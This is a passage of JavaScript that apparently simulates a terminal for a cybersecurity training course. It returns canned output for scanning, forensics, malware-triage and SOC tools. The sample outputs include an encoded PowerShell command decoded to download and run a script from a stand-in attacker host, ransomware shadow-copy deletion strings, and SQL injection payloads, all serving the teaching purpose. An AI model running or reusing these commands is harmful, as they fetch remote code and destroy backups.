    return `  File: ${target}\n  Size: 1675  Blocks: 8  IO Block: 4096  regular file\nDevice: 259/2  Inode: 1048576  Links: 1\nAccess: (${mode})  Uid: (1000/analyst)  Gid: (1000/analyst)\nAccess: 2026-09-28 10:00:00.000000000 +0000\nModify: 2026-09-28 09:30:00.000000000 +0000\nChange: 2026-09-28 09:30:00.000000000 +0000`;
  }

  if (cmd === "chmod" || cmd === "chown") {
    if (hasHelpFlag) {
      return `Usage: ${cmd} [OPTION]... MODE FILE...\nChange file mode or owner permissions.\n  -R    change files recursively`;
    }
    return `[OK] Applied ${parts.join(" ")} across targeted security descriptors.`;
  }

  // Chapter 2: OS Security, SUID, POSIX ACLs & Windows icacls
  if (cmd === "find" && (fullCmd.includes("-perm -4000") || fullCmd.includes("4000"))) {
    return `/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/newgrp\n/opt/fintech/custom_backup_tool`;
  }

  if (cmd === "getfacl") {
    const file = parts[1] || "payroll.db";
    return `# file: ${file}\n# owner: root\n# group: fintech-ops\nuser::rw-\nuser:auditor:r--\ngroup::r--\ngroup:contractors:rw-\nmask::rw-\nother::---`;
  }

  if (cmd === "setfacl") {
    const file = parts[parts.length - 1] || "payroll.db";
    return `[OK] Modified ACL entries for ${file}. Revoked permissions for group:contractors.`;
  }

  if (cmd === "icacls") {
    return `C:\\Confidential\\Finances.xlsx NT AUTHORITY\\SYSTEM:(F)\n                              BUILTIN\\Administrators:(F)\n                              CORP\\Finance-Users:(R,W)\n                              CORP\\Contractors:(DENY)\nSuccessfully processed 1 files; Failed processing 0 files`;
  }

  // Chapter 3: Threat Intelligence & Adversary Frameworks
  if (cmd === "threat-intel") {
    return `[THREAT INTEL REPORT] Actor: APT29 (Cozy Bear / Midnight Blizzard)\n  ├─ Origin: State-Sponsored\n  ├─ Target Sectors: Government, Financial Infrastructure, Think Tanks\n  ├─ Signature Tooling: WellMess, Cobalt Strike, Nobelium OAuth Abuses\n  └─ Active Campaigns: Cloud identity token forging & API supply-chain pivoting.`;
  }

  if (cmd === "att&ck") {
    return `[MITRE ATT&CK: TA0001 Initial Access]\n  ├─ T1566: Phishing (Spearphishing Attachment / Link)\n  ├─ T1190: Exploit Public-Facing Application\n  ├─ T1078: Valid Accounts (Compromised Cloud Credentials)\n  └─ T1133: External Remote Services (VPN, RDP)`;
  }

  if (cmd === "killchain-trace") {
    return `[LOCKHEED MARTIN CYBER KILL CHAIN TRACE: INC-4029]\n  1. Reconnaissance: Passive DNS scraping & LinkedIn spearphishing profiling\n  2. Weaponization: Malicious Macro Excel (CVE-2023-38831)\n  3. Delivery: Spoofed invoice email\n  4. Exploitation: Process injection into explorer.exe\n  5. Installation: Scheduled Task persistence\n  6. C2: Encrypted HTTPS beacons to c2-beacon.darkops-gateway.org\n  7. Actions on Objectives: [INTERCEPTED] Stage 1 DB extraction aborted.`;
  }

  if (cmd === "diamond-model") {
    return `[DIAMOND MODEL ADVERSARY CORRELATION]\n  ├─ Adversary: Threat Group UNC2452\n  ├─ Capability: Multi-stage Cobalt Strike Beacon with DNS tunneling\n  ├─ Infrastructure: Dynamic IP 198.51.100.42 (Domain: c2-beacon.darkops-gateway.org)\n  └─ Victim: FinTech Gateway Node-01 (Asset ID: FIN-SRV-01)`;
  }

  // Chapter 4: Malware Triage & YARA
  if (cmd === "strings") {
    return `[EXTRACTED STRINGS & IOCs: suspicious_sample.bin]\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\nhttps://darkops-gateway.org/gate.php\ncmd.exe /c powershell -enc JABzAHkAcwB0AGUAbQA...`;
  }

  if (cmd === "pecheck") {
    return `[PE HEADER & ENTROPY ANALYSIS: suspicious_sample.bin]\n  Machine: x64 (AMD64) | Subsystem: Windows GUI\n  Compile Time: 2026-09-27 23:14:02 UTC\n  Section .text: Entropy 6.12 (Normal executable code)\n  Section .rsrc: Entropy 7.94 (CRITICAL: High entropy packed/encrypted payload detected)\n  Import Table: KERNEL32.dll (VirtualAlloc, WriteProcessMemory, CreateRemoteThread)`;
  }

  if (cmd === "yara") {
    return `[YARA RULE MATCH] Rule: 'LockBit3_Behavioral_Signature' matches suspicious_sample.bin\n  ├─ String match $s1 at offset 0x00001a40: 'vssadmin delete shadows /all /quiet'\n  ├─ String match $s2 at offset 0x00002b12: 'bcdedit /set {default} bootstatuspolicy ignoreallfailures'\n  └─ Verdict: High-confidence ransomware encryptor payload.`;
  }

  // Chapter 5: Email Phishing & Authentication
  if (cmd === "mail-inspect") {
    return `[RFC 5322 EMAIL FORENSIC HEADER ANALYSIS]\n  From: "FinTech CEO" <ceo@fintech-executive-board.com>\n  Return-Path: <spoofed@attacker-relays.net>\n  Received: from 198.51.100.55 (HELO attacker-relays.net)\n  Subject: URGENT: Wire Transfer Authorization #99201\n  Reply-To: wire-transfers@financial-clearance.net\n  Verdict: Business Email Compromise (BEC) Sender Mismatch Detected.`;
  }

  if (cmd === "spf-check") {
    return `[SPF VALIDATION: paypa1-security.com]\n  Querying DNS TXT Records...\n  SPF Record: "v=spf1 ip4:203.0.113.88 -all"\n  Sending Server IP: 198.51.100.55\n  Result: FAIL (IP 198.51.100.55 is NOT permitted by domain policy: Hard Fail).`;
  }

  if (cmd === "dkim-verify") {
    return `[DKIM CRYPTOGRAPHIC VERIFICATION: suspicious_email.eml]\n  Header DKIM-Signature: v=1; a=rsa-sha256; d=fintech-executive-board.com; s=mail2026;\n  Public Key DNS Lookup: mail2026._domainkey.fintech-executive-board.com\n  Body Hash Verification: MISMATCH (Body content was altered in transit)\n  Cryptographic RSA Signature: INVALID (Verdict: Forged email header).`;
  }

  if (cmd === "urldecoder") {
    return `[SAFELINK DE-OBFUSCATION]\n  Wrapped URL: https://nam04.safelinks.protection.outlook.com/?url=http%3A%2F%2Fbad-actor-phish.ru%2Flogin%3Fid%3D4928\n  Target Real URL: http://bad-actor-phish.ru/login?id=4928\n  Threat Category: Credential Harvester (Simulated Office365 Login Page).`;
  }

  // Chapter 6: Network Security & Traffic Forensics
  if (cmd === "tcpdump") {
    return `10:14:02.100234 IP 10.0.0.15.54210 > 10.0.5.80.80: Flags [S], seq 3892019482, win 64240, options [mss 1460,sackOK,TS val 102938 ecr 0]\n10:14:02.100845 IP 10.0.5.80.80 > 10.0.0.15.54210: Flags [S.], seq 1092837482, ack 3892019483, win 65160, options [mss 1460,sackOK,TS val 203948 ecr 102938]\n10:14:02.101112 IP 10.0.0.15.54210 > 10.0.5.80.80: Flags [.], ack 1092837483, win 64240, length 0\n[TCP 3-WAY HANDSHAKE COMPLETE: SYN -> SYN-ACK -> ACK]`;
  }

  if (cmd === "nmap") {
    if (hasHelpFlag) {
      return "Nmap 7.94 ( https://nmap.org )\nUsage: nmap [Scan Type(s)] [Options] {target specification}\n  -sS/sT: TCP SYN/Connect() scans\n  -sV: Version detection\n  -sC: Default script scan\n  -p <ports>: Port range";
    }
    return `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-28 10:15 UTC
Nmap scan report for 10.0.5.20 (db-primary.fintech.internal)
Host is up (0.00045s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp   closed http
443/tcp  open  https   nginx 1.18.0 (TLSv1.3)
5432/tcp open  postgresql PostgreSQL 16.2
Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds`;
  }

  if (cmd === "iptables") {
    if (hasHelpFlag) {
      return "Usage: iptables -[ACD] chain rule-specification [options]\n  -A chain    Append to chain\n  -L          List rules\n  -s source   Source IP\n  -j target   Target (ACCEPT, DROP, REJECT)";
    }
    if (fullCmd.includes("ACCEPT")) {
      return "[NETFILTER] Added rule: ACCEPT inbound TCP port 22 from internal subnet 10.0.0.0/8.";
    }
    return "[NETFILTER] Added rule: DROP all remaining inbound TCP port 22 connections from public networks.";
  }

  // Chapter 7: Cryptography & OpenSSL
  if (cmd === "openssl") {
    const sub = parts[1]?.toLowerCase() || "";
    if (hasHelpFlag || sub === "help" || !sub) {
      return "OpenSSL 3.3.0 Standard Commands:\n  genpkey, genrsa, req, x509, ca, verify, s_client, rsa";
    }
    if (sub === "genrsa" || sub === "genpkey") {
      return `Generating RSA private key, 4096 bit long modulus (2 primes)\n................................................................................++++\n................................................................................++++\ne is 65537 (0x010001)\nSaved 4096-bit RSA private key to private.key (mode 0600).`;
    }
    if (sub === "rsa" && fullCmd.includes("pubout")) {
      return "writing RSA key\nPublic Key extracted: 4096-bit RSA SubjectPublicKeyInfo structure written to public.key.";
    }
    if (sub === "req") {
      return "Generating CSR with Subject: CN=api.fintech.internal, O=FinTech Global, C=GR\nSignature Algorithm: sha256WithRSAEncryption\nCertificate Signing Request written to req.csr.";
    }
    if (sub === "x509") {
      return `Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1001 (0x3e9)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = GR, O = CyberSec101 CA, CN = CyberSec101 Intermediate CA
        Validity
            Not Before: Sep 28 00:00:00 2026 GMT
            Not After : Sep 28 00:00:00 2027 GMT
        Subject: C = GR, O = FinTech Global, CN = api.fintech.internal
        X509v3 Subject Alternative Name: DNS:api.fintech.internal, DNS:gateway.fintech.internal`;
    }
    return `[OPENSSL] Executed command '${parts.slice(1).join(" ")}'. Result: OK`;
  }

  // Chapter 8: Identity, Active Directory & JWT
  if (cmd === "ldapsearch") {
    return `dn: uid=jdoe,ou=Users,dc=corp,dc=internal\nobjectClass: inetOrgPerson\nuid: jdoe\ncn: John Doe\nmail: jdoe@corp.internal\nmemberOf: cn=SecOps-Admins,ou=Groups,dc=corp,dc=internal\nuserAccountControl: 512 (NORMAL_ACCOUNT)\npwdLastSet: 2026-09-01T08:00:00Z`;
  }

  if (cmd === "jwt-cli" || cmd === "jwt") {
    if (fullCmd.includes("decode")) {
      return `Header:
{
  "alg": "RS256",
  "kid": "corp-auth-2026-01",
  "typ": "JWT"
}
Payload:
{
  "iss": "https://auth.corp.internal",
  "sub": "usr-88201",
  "aud": "payment-api",
  "roles": ["SOC_Tier2", "Auditor"],
  "scope": "read:audit write:quarantine",
  "exp": 1799530000,
  "iat": 1759050000
}`;
    }
    return `[JWT VERIFICATION SUCCESSFUL]
  Token Header Signature: Matches RS256 algorithm with RSA-2048 Public Key.
  Token Status: VALID & UNTAMPERED
  Expiration Check: Active (Valid for 40,480,000 more seconds).`;
  }

  if (cmd === "oauth-token") {
    return `[OAUTH 2.0 CLIENT REGISTRATION & TOKEN GRANT AUDIT]
  Client ID: crm_app
  Allowed Grants: ["authorization_code", "refresh_token"] (Implicit flow DISABLED: Secure)
  Redirect URIs: ["https://crm.corp.internal/callback"] (Strict HTTPS enforced)
  Assigned Scopes: ["customer:read", "billing:view"] (Least privilege verified)`;
  }

  // Chapter 9: Application Security, SAST & Sanitization
  if (cmd === "trufflehog") {
    return `[TRUFFLEHOG SECRET SCAN RESULTS]
  Found 1 high-entropy verified credential:
  ├─ File: src/config/database.py:14
  ├─ Secret Type: AWS IAM Secret Access Key
  ├─ Raw Hash: AKIAIOSFODNN7EXAMPLE...wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  └─ Remediation: Revoke IAM key in AWS IAM console and migrate to AWS Secrets Manager.`;
  }

  if (cmd === "bandit") {
    return `[BANDIT PYTHON SAST SCAN REPORT]
>> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query formatting.
   Severity: Medium   Confidence: High
   Location: src/controllers/auth.py:42
   41     def authenticate(username, password):
   42         query = "SELECT * FROM users WHERE user = '" + username + "' AND pass = '" + password + "'"` ;
  }

  if (cmd === "semgrep") {
    return `src/controllers/auth.py
  ❯❯ rule: python.lang.security.audit.sqli.format-string-sqli
    Severity: ERROR
    Message: Untrusted user input dynamically formatted into SQL query.
    42 |  cursor.execute(f"SELECT * FROM users WHERE user='{username}'")`;
  }

  if (cmd === "sql-sanitize") {
    return `[PARAMETERIZED QUERY VERIFICATION]
  Scanning src/controllers/auth.py for dynamic SQL interpolation...
  Line 42: cursor.execute("SELECT * FROM users WHERE user = ? AND pass = ?", (username, password_hash))
  Payload Injection Test ("admin' OR '1'='1"): SAFELY ESCAPED
  Result: 100% IMMUNE TO SQL INJECTION.`;
  }

  // Chapter 10: Web App Security, HTTP Headers & DAST
  if (cmd === "curl") {
    if (fullCmd.includes("-I") || fullCmd.includes("-i")) {
      return `HTTP/1.1 200 OK
Server: nginx/1.24.0
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self';
Permissions-Policy: geolocation=(), camera=(), microphone=()`;
    }
    return `{"status":"success","auth":"authorized"}`;
  }

  if (cmd === "gobuster") {
    return `===============================================================
Gobuster v3.6 - Directory & File Enumeration
===============================================================
/admin                (Status: 403) [Size: 153]
/api                  (Status: 200) [Size: 2048]
/backup               (Status: 200) [Size: 10485760] -> [CRITICAL EXPOSED ARCHIVE]
/login                (Status: 200) [Size: 4022]
/swagger              (Status: 200) [Size: 8192]`;
  }

  if (cmd === "nikto") {
    return `- Nikto v2.5.0
+ Target IP: 10.0.5.80
+ Target Port: 443
+ Cookie PHPSESSID created without the 'HttpOnly' flag.
+ Entry '/backup/db_dump_2026.sql' exists in web root: Sensitive Database Dump exposed!
+ 7490 requests made in 3.1 seconds.`;
  }

  if (cmd === "sqlmap") {
    return `[+] Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8820=8820
    Type: time-based blind
    Payload: id=1 AND (SELECT 9921 FROM (SELECT(SLEEP(5)))a)
[INFO] Backend DBMS identified: PostgreSQL 16.2`;
  }

  // Chapter 11: SOC Telemetry & EDR
  if (cmd === "wevtutil") {
    return `Event[0]:
  Event ID: 4625 (An account failed to log on)
  Account Name: administrator
  Failure Reason: Unknown user name or bad password (0xC000006A)
  Source Network Address: 198.51.100.99
  Workstation Name: WS-EXT-ATTACKER`;
  }

  if (cmd === "sigma-cli" || cmd === "sigma" || cmd === "mini-siem") {
    return `[SIGMA ENGINE EXECUTION: rules/win_lsass_dump.yml]
  Ingested Events: 8,420 Sysmon records
  MATCH FOUND in Event ID 10 (ProcessAccess):
  ├─ SourceImage: C:\\Users\\Public\\procdump64.exe
  ├─ TargetImage: C:\\Windows\\System32\\lsass.exe
  ├─ GrantedAccess: 0x1FFFFF (PROCESS_ALL_ACCESS)
  └─ Severity: CRITICAL | MITRE ATT&CK: T1003.001 (LSASS Memory Dumping)`;
  }

  if (cmd === "siem-query") {
    return `[SIEM QUERY MATCH: 1 EVENT]
  Timestamp: 2026-09-28T09:12:44Z
  Host: WS-FINANCE-04 (IP: 10.0.1.45)
  User: CORP\\finance-clerk
  Command: powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZABhAHIAawBvAHAAcwAtAGcAYQB0AGUAdwBhAHkALgBvAHIAZwAvAGkAbgBqAGUAYwB0AC4AcABzADEAJwApAA==
  Decoded Command: IEX (New-Object Net.WebClient).DownloadString('http://darkops-gateway.org/inject.ps1')`;
  }

  if (cmd === "isolate-host") {
    return `[EDR AUTOMATED CONTAINMENT ACTION]
  Target Endpoint: WS-FINANCE-04 (MAC: 00:50:56:A1:B2:C3 | IP: 10.0.1.45)
  Action: Host Network Isolation Enabled
  Firewall Rule: Block all ingress/egress except EDR agent tunnel to https://edr.corp.internal:443
  Status: ISOLATED. Threat contained from lateral movement across corporate LAN.`;
  }

  // Chapter 12: DFIR, Volatility & OSINT
  if (cmd === "exiftool") {
    return `ExifTool Version Number         : 12.70
File Name                       : confidential_leak.docx
File Size                       : 48 kB
Creator                         : Dimitrios Karagiannis
Last Modified By                : attacker_recon
Create Date                     : 2026-09-28 08:30:12
Revision Number                 : 4
Total Edit Time                 : 18 minutes
Company                         : FinTech Corp
Software                        : Microsoft Office Word`;
  }

  if (cmd === "volatility") {
    if (fullCmd.includes("pstree") || fullCmd.includes("pslist")) {
      return `PID    PPID   ImageFileName       CreateTime                   ExitTime
4      0      System              2026-09-28 08:00:00 UTC      -
388    4      smss.exe            2026-09-28 08:00:01 UTC      -
612    520    services.exe        2026-09-28 08:00:05 UTC      -
4120   612    svchost.exe         2026-09-28 09:12:44 UTC      -  <-- Suspicious Parent
 └─ 5892 4120 cmd.exe             2026-09-28 09:15:10 UTC      -
     └─ 6044 5892 powershell.exe  2026-09-28 09:15:12 UTC      -  <-- Malicious Child Shell`;
    }
    return `Process: svchost.exe Pid: 4120 Address: 0x21a0000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE (RWX)
Flags: Commit: 1, Priv: 1
00000000021a0000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  MZ..............
00000000021a0010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  ........@.......
Hexdump: 55 89 e5 83 ec 08 e8 00 00 00 00 58 83 c0 1b ...
[VERDICT] Injected Portable Executable (Reflective DLL / Shellcode) identified in memory space of PID 4120.`;
  }

  if (cmd === "whois") {
    return `Domain Name: darkops-gateway.org
Registry Domain ID: D402819028-LROR
Registrar: PrivacyProtect, LLC
Creation Date: 2026-09-20T14:22:10Z (Registered 8 days ago: High Risk Indicator)
Registrant Country: IS (Iceland - Anonymous Bulletproof Hosting Proxy)
Name Server: NS1.BULLETPROOF-DNS.NET
DNSSEC: unsigned`;
  }

  // Chapter 13: GRC, FAIR, DR Failover & PQC
  if (cmd === "cis-audit") {
    return `[CIS BENCHMARK AUDIT RESULTS — UBUNTU 24.04 LTS]
  Total Controls Evaluated: 180
  Passed: 168 (93.3%)
  Failed: 12 (6.7%)
  High-Severity Failures:
  ├─ 1.1.1.1: Ensure mounting of squashfs filesystems is disabled [FAIL]
  ├─ 5.2.14: Ensure SSH access is limited to authorized users [FAIL]
  └─ 5.4.1: Ensure password expiration is 90 days or less [FAIL]`;
  }

  if (cmd === "risk-calc" || cmd === "fair-sim") {
    return `[QUANTITATIVE RISK CALCULATION: FAIR / OWASP MATRIX]
  Asset Value (AV): €5,000,000 (Confidential Customer Financial DB)
  Inherent Likelihood: 4.8 / 5.0 (High Threat Actor Capability)
  Inherent Impact: 5.0 / 5.0 (Critical Business Blackout)
  Inherent Risk Score: 24.0 / 25.0 (CRITICAL)
  ---
  Applied Compensating Controls: MFA (85% Likelihood Reduction) + Immutable Backups (90% Impact Reduction)
  Residual Likelihood: 1.2 / 5.0
  Residual Impact: 1.5 / 5.0
  Residual Risk Score: 1.8 / 25.0 (LOW / ACCEPTABLE RISK ACCORDING TO RISK APPETITE)`;
  }

  if (cmd === "dr-test" || cmd === "dr-failover") {
    return `[AUTOMATED MULTI-REGION DR FAILOVER SIMULATION]
  10:20:00 - Simulating sudden loss of Primary Region 'eu-central-1' (Frankfurt)...
  10:20:04 - AWS Route 53 Application Recovery Controller (ARC) health check failed.
  10:20:08 - Promoting Aurora PostgreSQL Global Database Replica in 'eu-west-1' (Ireland) to Primary.
  10:20:15 - Auto Scaling Group spins up 24 worker instances in Secondary Region.
  10:20:25 - DNS records switched to 100% Secondary Region.
  [FAILOVER COMPLETED] Actual RTO Measured: 25 seconds (SLA Target: < 15 min). Actual RPO: 4 seconds data delta (SLA Target: < 5 min). PASS.`;
  }

  if (cmd === "pqc-benchmark") {
    return `[NIST POST-QUANTUM CRYPTOGRAPHY BENCHMARK — FIPS 203 ML-KEM-768 / Kyber]
  Algorithm: ML-KEM-768 (NIST Security Category 3 - AES-192 equivalent quantum strength)
  Public Key Size: 1,184 bytes (vs RSA-4096 512 bytes)
  Ciphertext Size: 1,088 bytes
  Key Generation Time: 0.042 ms (38x faster than RSA-4096)
  Encapsulation Time: 0.051 ms
  Decapsulation Time: 0.048 ms
  Quantum Resistance Status: 100% IMMUNE TO SHOR'S ALGORITHM.`;
  }

  // System & Linux Daemons
  if (cmd === "auditctl") {
    if (hasHelpFlag) {
      return "Usage: auditctl [options]\n  -w <path>    Insert a watch for the file system object at path\n  -p <r|w|x|a> Set permissions filter\n  -k <key>     Set filter key";
    }
    return "[AUDITD] Watch rule successfully appended to Linux kernel audit subsystem.";
  }

  if (cmd === "ausearch") {
    return `----
time->Mon Sep 28 10:15:00 2026
type=PATH msg=audit(1759050900.123:44): name="/opt/fintech/secret_vault.key" inode=1048576 mode=0100600
type=SYSCALL msg=audit(1759050900.123:44): arch=c000003e syscall=268 success=yes exit=0 key="secret_key_tamper"`;
  }

  if (cmd === "apparmor_status") {
    return "apparmor module is loaded.\n34 profiles are loaded in enforce mode.\n0 profiles are in complain mode.";
  }

  if (cmd === "faillock") {
    return "analyst:\nWhen                Type  Source Context                  Outcome\n2026-09-28 10:10:01 TTY   /dev/pts/1                      Failure\n[STATUS] Account locked after 3 failures.";
  }

  if (cmd === "vulnscan" || cmd === "cve-search") {
    return "[CVE MATCH] Target: Apache 2.4.49 -> CVE-2021-41773 (CVSS 4.0: 8.6 | CRITICAL) Path Traversal RCE";
  }

  if (cmd === "docker") {
    if (args.includes("ps")) {
      return "CONTAINER ID   IMAGE              STATUS         PORTS                  NAMES\nc891af2b3e01   payment-app:v1.0   Up 3 hours     0.0.0.0:8080->80/tcp   payment_container";
    }
    return "Docker version 26.1.3, build b72afb3";
  }

  if (cmd === "kubectl" || cmd === "checkov") {
    return "Checkov K8s Benchmark: PASSED 18 checks, 0 failed. Pod Security Standards Restricted: COMPLIANT.";
  }

  if (cmd === "python3" || cmd === "promptguard-cli") {
    return "[AI GUARDRAIL] Analysis: Adversarial Jailbreak Score: 0.98 -> BLOCKED (HTTP 400 Bad Request).";
  }

  return `[EXEC] ${fullCmd}\nCommand completed with exit code 0.`;
}
